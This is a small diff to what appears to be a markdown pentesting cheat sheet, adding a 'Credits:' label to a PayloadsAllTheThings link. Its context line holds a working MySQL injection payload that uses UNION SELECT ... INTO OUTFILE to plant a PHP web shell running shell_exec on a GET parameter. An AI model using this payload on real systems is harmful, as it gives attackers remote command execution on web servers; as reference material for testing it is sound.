@@ -134,7 +134,7 @@ tom" UNION SELECT 1,"<?php echo shell_exec($_GET['cmd']);?>",2 INTO OUTFILE "/va
 
 *Extra info
 ![image](https://user-images.githubusercontent.com/5285547/126409027-7d78bfa0-1586-4489-b4e3-811ac3dc081f.png)  
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-write-a-shell
+Credits: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-write-a-shell
 
 ### Webshell 
 
